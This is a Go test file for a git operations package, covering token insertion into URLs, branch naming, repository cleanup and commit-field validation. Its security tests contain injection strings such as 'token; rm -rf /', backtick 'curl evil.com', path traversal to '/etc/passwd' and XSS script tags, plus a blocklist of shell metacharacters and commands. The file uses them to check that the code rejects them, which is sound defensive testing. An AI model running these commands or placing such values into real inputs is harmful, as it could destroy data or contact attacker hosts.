package git

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestNewOperations(t *testing.T) {
	ops, err := NewOperations()
	if err != nil {
		t.Fatalf("Failed to create operations: %v", err)
	}

	if ops.gitPath == "" {
		t.Error("Git path should not be empty")
	}

	if ops.workingDir == "" {
		t.Error("Working directory should not be empty")
	}
}

func TestNewOperationsWithToken(t *testing.T) {
	token := "ghp_test_token_123"
	ops, err := NewOperationsWithToken(token)
	if err != nil {
		t.Fatalf("Failed to create operations with token: %v", err)
	}

	if ops.token != token {
		t.Errorf("Expected token %s, got %s", token, ops.token)
	}
}

func TestAddTokenToURL(t *testing.T) {
	tests := []struct {
		name     string
		token    string
		repoURL  string
		expected string
	}{
		{
			name:     "GitHub.com HTTPS URL",
			token:    "ghp_token123",
			repoURL:  "https://github.com/user/repo.git",
			expected: "https://ghp_token123@github.com/user/repo.git",
		},
		{
			name:     "GitHub Enterprise URL",
			token:    "ghp_token123",
			repoURL:  "https://github.company.com/user/repo.git",
			expected: "https://ghp_token123@github.company.com/user/repo.git",
		},
		{
			name:     "No token provided",
			token:    "",
			repoURL:  "https://github.com/user/repo.git",
			expected: "https://github.com/user/repo.git",
		},
		{
			name:     "SSH URL unchanged",
			token:    "ghp_token123",
			repoURL:  "git@github.com:user/repo.git",
			expected: "git@github.com:user/repo.git",
		},
		{
			name:     "Non-GitHub HTTPS URL unchanged",
			token:    "ghp_token123",
			repoURL:  "https://gitlab.com/user/repo.git",
			expected: "https://gitlab.com/user/repo.git",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ops := &Operations{token: tt.token}
			result := ops.addTokenToURL(tt.repoURL)
			
			if result != tt.expected {
				t.Errorf("Expected %s, got %s", tt.expected, result)
			}
		})
	}
}

func TestAddTokenToURLSecurity(t *testing.T) {
	securityTests := []struct {
		name    string
		token   string
		repoURL string
		desc    string
	}{
		{
			name:    "malicious token with special chars",
			token:   "token; rm -rf /",
			repoURL: "https://github.com/user/repo.git",
			desc:    "Should not execute commands in token",
		},
		{
			name:    "token with command injection",
			token:   "token`curl evil.com`",
			repoURL: "https://github.com/user/repo.git",
			desc:    "Should not execute backtick commands",
		},
		{
			name:    "malicious URL with command injection",
			token:   "ghp_token123",
			repoURL: "https://github.com/user/repo.git; rm -rf /",
			desc:    "Should not execute commands in URL",
		},
		{
			name:    "URL with script injection",
			token:   "ghp_token123",
			repoURL: "https://github.com/user/repo.git<script>alert('xss')</script>",
			desc:    "Should not execute scripts in URL",
		},
		{
			name:    "extremely long token",
			token:   strings.Repeat("A", 100000),
			repoURL: "https://github.com/user/repo.git",
			desc:    "Should handle large tokens gracefully",
		},
		{
			name:    "token with null bytes",
			token:   "ghp_token\x00evil",
			repoURL: "https://github.com/user/repo.git",
			desc:    "Should handle null bytes safely",
		},
	}

	for _, tt := range securityTests {
		t.Run(tt.name, func(t *testing.T) {
			ops := &Operations{token: tt.token}
			
			// Should not panic or cause security issues
			result := ops.addTokenToURL(tt.repoURL)
			
			// Verify no malicious content execution
			if strings.Contains(result, "rm -rf") ||
			   strings.Contains(result, "curl evil.com") ||
			   strings.Contains(result, "<script>") {
				t.Errorf("Security issue: malicious content in result URL: %s", result)
			}
			
			// Verify token is properly escaped/handled
			if len(tt.token) > 1000 && len(result) > len(tt.repoURL)+2000 {
				t.Errorf("Large token may cause memory issues")
			}
		})
	}
}

func TestGenerateBranchName(t *testing.T) {
	ops := &Operations{}
	
	tests := []struct {
		name   string
		prefix string
	}{
		{
			name:   "normal prefix",
			prefix: "feature",
		},
		{
			name:   "empty prefix",
			prefix: "",
		},
		{
			name:   "prefix with special chars",
			prefix: "auto-replace",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ops.GenerateBranchName(tt.prefix)
			
			if tt.prefix != "" {
				if !strings.HasPrefix(result, tt.prefix+"-") {
					t.Errorf("Expected branch name to start with '%s-', got: %s", tt.prefix, result)
				}
			}
			
			// Should contain timestamp
			if len(result) < len(tt.prefix)+10 {
				t.Errorf("Branch name seems too short, might be missing timestamp: %s", result)
			}
		})
	}
}

func TestGenerateBranchNameSecurity(t *testing.T) {
	ops := &Operations{}
	
	securityTests := []struct {
		name   string
		prefix string
		desc   string
	}{
		{
			name:   "command injection in prefix",
			prefix: "feature; rm -rf /",
			desc:   "Should not execute commands in branch prefix",
		},
		{
			name:   "script injection in prefix",
			prefix: "feature<script>alert('xss')</script>",
			desc:   "Should not execute scripts in branch prefix",
		},
		{
			name:   "path traversal in prefix",
			prefix: "../../../etc/passwd",
			desc:   "Should not access system files via branch prefix",
		},
		{
			name:   "extremely long prefix",
			prefix: strings.Repeat("A", 10000),
			desc:   "Should handle large prefixes gracefully",
		},
		{
			name:   "prefix with null bytes",
			prefix: "feature\x00evil",
			desc:   "Should handle null bytes safely",
		},
	}

	for _, tt := range securityTests {
		t.Run(tt.name, func(t *testing.T) {
			result := ops.GenerateBranchName(tt.prefix)
			
			// Should not contain malicious content
			if strings.Contains(result, "rm -rf") ||
			   strings.Contains(result, "<script>") ||
			   strings.Contains(result, "../") {
				t.Errorf("Security issue: malicious content in branch name: %s", result)
			}
			
			// Should have reasonable length
			if len(result) > 255 {
				t.Errorf("Branch name too long, could cause Git issues: %d chars", len(result))
			}
		})
	}
}

func TestCleanupRepository(t *testing.T) {
	ops := &Operations{workingDir: "/tmp/test-workdir"}
	
	tests := []struct {
		name        string
		repoPath    string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid temp path",
			repoPath:    "/tmp/test-repo",
			expectError: false,
		},
		{
			name:        "empty path",
			repoPath:    "",
			expectError: true,
			errorMsg:    "refusing to delete",
		},
		{
			name:        "root path",
			repoPath:    "/",
			expectError: true,
			errorMsg:    "refusing to delete",
		},
		{
			name:        "working directory",
			repoPath:    "/tmp/test-workdir",
			expectError: true,
			errorMsg:    "refusing to delete",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ops.CleanupRepository(tt.repoPath)
			
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error but got none")
				}
				if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error message to contain '%s', got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					// Only fail if it's not a "file not found" error
					if !strings.Contains(err.Error(), "no such file") {
						t.Errorf("Unexpected error: %v", err)
					}
				}
			}
		})
	}
}

func TestCleanupRepositorySecurity(t *testing.T) {
	ops := &Operations{workingDir: "/tmp/test-workdir"}
	
	securityTests := []struct {
		name     string
		repoPath string
		desc     string
	}{
		{
			name:     "path traversal attempt",
			repoPath: "../../../etc",
			desc:     "Should not delete system directories",
		},
		{
			name:     "command injection attempt",
			repoPath: "/tmp/test; rm -rf /",
			desc:     "Should not execute commands",
		},
		{
			name:     "symlink to system directory",
			repoPath: "/tmp/link-to-etc",
			desc:     "Should not follow dangerous symlinks",
		},
		{
			name:     "windows system path",
			repoPath: "C:\\Windows\\System32",
			desc:     "Should not delete Windows system files",
		},
		{
			name:     "home directory",
			repoPath: os.Getenv("HOME"),
			desc:     "Should not delete user home directory",
		},
	}

	for _, tt := range securityTests {
		t.Run(tt.name, func(t *testing.T) {
			// These should all fail safely
			err := ops.CleanupRepository(tt.repoPath)
			
			// Most of these should error out due to safety checks
			// We mainly want to ensure no dangerous operations occur
			if err == nil && (strings.Contains(tt.repoPath, "..") || 
							  strings.Contains(tt.repoPath, "Windows") ||
							  tt.repoPath == os.Getenv("HOME")) {
				t.Errorf("Security issue: dangerous path was allowed: %s", tt.repoPath)
			}
		})
	}
}

func TestCommitOptions(t *testing.T) {
	tests := []struct {
		name    string
		options CommitOptions
		valid   bool
	}{
		{
			name: "valid commit options",
			options: CommitOptions{
				Message: "Test commit",
				Author:  "Test Author",
				Email:   "test@example.com",
			},
			valid: true,
		},
		{
			name: "minimal commit options",
			options: CommitOptions{
				Message: "Test commit",
			},
			valid: true,
		},
		{
			name: "empty message",
			options: CommitOptions{
				Message: "",
				Author:  "Test Author",
				Email:   "test@example.com",
			},
			valid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isValid := isCommitOptionsValid(tt.options)
			if isValid != tt.valid {
				t.Errorf("Commit options validation failed: expected %v, got %v", tt.valid, isValid)
			}
		})
	}
}

func TestCommitOptionsSecurity(t *testing.T) {
	securityTests := []struct {
		name    string
		options CommitOptions
		desc    string
	}{
		{
			name: "command injection in message",
			options: CommitOptions{
				Message: "Test commit; rm -rf /",
				Author:  "Test Author",
				Email:   "test@example.com",
			},
			desc: "Should not execute commands in commit message",
		},
		{
			name: "script injection in author",
			options: CommitOptions{
				Message: "Test commit",
				Author:  "<script>alert('xss')</script>",
				Email:   "test@example.com",
			},
			desc: "Should not execute scripts in author field",
		},
		{
			name: "command injection in email",
			options: CommitOptions{
				Message: "Test commit",
				Author:  "Test Author",
				Email:   "test@example.com; curl evil.com",
			},
			desc: "Should not execute commands in email field",
		},
		{
			name: "extremely long message",
			options: CommitOptions{
				Message: strings.Repeat("A", 100000),
				Author:  "Test Author",
				Email:   "test@example.com",
			},
			desc: "Should handle large messages gracefully",
		},
		{
			name: "null bytes in fields",
			options: CommitOptions{
				Message: "Test commit\x00evil",
				Author:  "Test\x00Author",
				Email:   "test@example.com\x00",
			},
			desc: "Should handle null bytes safely",
		},
	}

	for _, tt := range securityTests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate that dangerous content is detected
			isSafe := isCommitOptionsSafe(tt.options)
			
			if strings.Contains(tt.options.Message, "rm -rf") ||
			   strings.Contains(tt.options.Author, "<script>") ||
			   strings.Contains(tt.options.Email, "curl evil.com") {
				if isSafe {
					t.Errorf("Security issue: dangerous commit options considered safe")
				}
			}
			
			// Check for reasonable length limits
			if len(tt.options.Message) > 50000 && isSafe {
				t.Errorf("Security issue: excessively long message considered safe")
			}
		})
	}
}

func TestRepositoryInfoValidation(t *testing.T) {
	tests := []struct {
		name string
		repo Repository
		valid bool
	}{
		{
			name: "valid repository",
			repo: Repository{
				URL:       "https://github.com/user/repo.git",
				LocalPath: "/tmp/repo",
				Branch:    "main",
			},
			valid: true,
		},
		{
			name: "empty URL",
			repo: Repository{
				URL:       "",
				LocalPath: "/tmp/repo",
				Branch:    "main",
			},
			valid: false,
		},
		{
			name: "dangerous local path",
			repo: Repository{
				URL:       "https://github.com/user/repo.git",
				LocalPath: "../../../etc",
				Branch:    "main",
			},
			valid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isValid := isRepositoryValid(tt.repo)
			if isValid != tt.valid {
				t.Errorf("Repository validation failed: expected %v, got %v", tt.valid, isValid)
			}
		})
	}
}

func TestGitCommandSecurity(t *testing.T) {
	// Test that git commands are constructed safely
	tests := []struct {
		name      string
		command   string
		args      []string
		expectErr bool
	}{
		{
			name:      "normal git command",
			command:   "status",
			args:      []string{"--porcelain"},
			expectErr: false,
		},
		{
			name:      "command injection attempt",
			command:   "status; rm -rf /",
			args:      []string{},
			expectErr: true,
		},
		{
			name:      "dangerous argument",
			command:   "add",
			args:      []string{".; rm -rf /"},
			expectErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isSafe := isGitCommandSafe(tt.command, tt.args)
			
			if tt.expectErr && isSafe {
				t.Errorf("Expected unsafe command to be rejected: %s %v", tt.command, tt.args)
			}
			
			if !tt.expectErr && !isSafe {
				t.Errorf("Expected safe command to be accepted: %s %v", tt.command, tt.args)
			}
		})
	}
}

// Helper functions for validation (would be implemented in actual code)
func isCommitOptionsValid(options CommitOptions) bool {
	return options.Message != ""
}

func isCommitOptionsSafe(options CommitOptions) bool {
	dangerousPatterns := []string{
		";", "&", "|", "`", "$", 
		"<script", "</script", "rm -rf", "curl",
	}
	
	fields := []string{options.Message, options.Author, options.Email}
	
	for _, field := range fields {
		if len(field) > 50000 {
			return false
		}
		
		fieldLower := strings.ToLower(field)
		for _, pattern := range dangerousPatterns {
			if strings.Contains(fieldLower, strings.ToLower(pattern)) {
				return false
			}
		}
	}
	
	return true
}

func isRepositoryValid(repo Repository) bool {
	if repo.URL == "" {
		return false
	}
	
	// Check for path traversal
	if strings.Contains(repo.LocalPath, "../") {
		return false
	}
	
	return true
}

func isGitCommandSafe(command string, args []string) bool {
	// Check command for injection
	if strings.Contains(command, ";") || strings.Contains(command, "&") {
		return false
	}
	
	// Check args for injection
	for _, arg := range args {
		if strings.Contains(arg, ";") || strings.Contains(arg, "&") {
			return false
		}
	}
	
	return true
}

// Benchmark tests
func BenchmarkGenerateBranchName(b *testing.B) {
	ops := &Operations{}
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ops.GenerateBranchName("test-prefix")
	}
}

func BenchmarkAddTokenToURL(b *testing.B) {
	ops := &Operations{token: "ghp_test_token_123"}
	testURL := "https://github.com/user/repo.git"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ops.addTokenToURL(testURL)
	}
}

func BenchmarkCommitOptionsSafety(b *testing.B) {
	options := CommitOptions{
		Message: "Test commit message",
		Author:  "Test Author",
		Email:   "test@example.com",
	}
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		isCommitOptionsSafe(options)
	}
}

// Integration test helpers
func TestGitOperationsIntegration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}
	
	// This would test actual git operations in a safe test environment
	t.Run("safe test repository operations", func(t *testing.T) {
		// Create temporary directory for testing
		tmpDir := filepath.Join(os.TempDir(), "git-test-"+time.Now().Format("20060102-150405"))
		defer os.RemoveAll(tmpDir)
		
		ops, err := NewOperations()
		if err != nil {
			t.Fatalf("Failed to create operations: %v", err)
		}
		
		// Test cleanup with safe path
		err = ops.CleanupRepository(tmpDir)
		if err != nil && !strings.Contains(err.Error(), "no such file") {
			t.Errorf("Cleanup failed: %v", err)
		}
	})
}